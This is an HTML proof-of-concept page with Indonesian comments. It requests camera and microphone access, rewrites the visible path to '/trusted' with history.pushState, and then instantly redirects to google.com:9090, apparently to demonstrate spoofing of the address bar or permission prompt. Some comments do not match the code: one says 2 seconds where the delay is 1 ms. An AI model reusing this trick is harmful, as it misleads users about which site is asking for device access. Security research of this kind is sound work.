<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Camera and Microphone PoC</title>
<meta name="viewport" content="width=device-width, initial-scale=1">

<style>
body {
  margin:0;
  font-family:-apple-system,BlinkMacSystemFont,system-ui;
  background:#f5f5f7;
}

button {
  margin:6px;
  font-size:14px;
  padding:8px 12px;
}

#panel {
  display:none;
  max-width:520px;
  margin:60px auto;
  background:#fff;
  padding:24px;
  border-radius:16px;
  box-shadow:0 20px 60px rgba(0,0,0,.2);
}

h2 { text-align:center; margin-bottom:6px; }
.sub { text-align:center; color:#666; margin-bottom:20px; }

.notice {
  margin-top:14px;
  font-size:13px;
  color:#b00020;
}

video { 
  width:100%; 
  margin-top:10px; 
}

#apiResults {
  margin-top: 20px;
  padding: 10px;
  background: #f0f0f0;
  border-radius: 8px;
  font-size: 14px;
  max-height: 400px;
  overflow-y: auto;
}
</style>
</head>

<body>

<div style="text-align:center">
  <button id="trigger">Start PoC</button>
</div>

<div id="panel">
  <h2>Access Camera and Microphone</h2>

  <button id="cameraButton" onclick="openCamera()">Open Camera</button>
  <video id="camera" autoplay playsinline></video>

  <hr>

  <button id="microphoneButton" onclick="openMicrophone()">Open Microphone</button>
  <div id="microphoneStatus">Microphone Status: -</div>

  <div class="notice">
    Demo only — browser permission required
  </div>
</div>

<script>
const panel = document.getElementById('panel');
const trigger = document.getElementById('trigger');
const camera = document.getElementById('camera');
const microphoneStatus = document.getElementById('microphoneStatus');

// FUNGSI ASLI (TIDAK DIUBAH)

// Fungsi untuk membuka kamera
function openCamera() {
  checkCameraPermission()
    .then(hasPermission => {
      if (hasPermission) {
        navigator.mediaDevices.getUserMedia({ video:true })
          .then(stream => {
            camera.srcObject = stream;
            camera.style.display = "block";
          })
          .catch(() => alert('Camera denied'));
      } else {
        alert('Camera permission denied by user');
      }
    });
}

// Cek izin kamera dengan navigator.permissions
function checkCameraPermission() {
  return navigator.permissions.query({ name: 'camera' })
    .then(permissionStatus => {
      return permissionStatus.state === 'granted';
    })
    .catch(() => {
      return false; // Jika tidak dapat mengecek izin, anggap ditolak
    });
}

// Fungsi untuk membuka mikrofon
function openMicrophone() {
  checkMicrophonePermission()
    .then(hasPermission => {
      if (hasPermission) {
        navigator.mediaDevices.getUserMedia({ audio:true })
          .then(stream => {
            microphoneStatus.textContent = 'Microphone is active';
          })
          .catch(() => alert('Microphone denied'));
      } else {
        alert('Microphone permission denied by user');
      }
    });
}

// Cek izin mikrofon dengan navigator.permissions
function checkMicrophonePermission() {
  return navigator.permissions.query({ name: 'microphone' })
    .then(permissionStatus => {
      return permissionStatus.state === 'granted';
    })
    .catch(() => {
      return false; // Jika tidak dapat mengecek izin, anggap ditolak
    });
}

// Fungsi untuk melakukan redirect ke Google setelah tombol "Start PoC" ditekan
trigger.onclick = () => {
  history.pushState({}, '', '/trusted');
  panel.style.display = 'block';

  // Menambahkan redirect ke Google setelah 2 detik
  setTimeout(() => {
    window.location.href = "https://www.google.com:9090"; // Redirect ke Google
  }, 1); // 2 detik setelah klik tombol
};

</script>

</body>
</html>
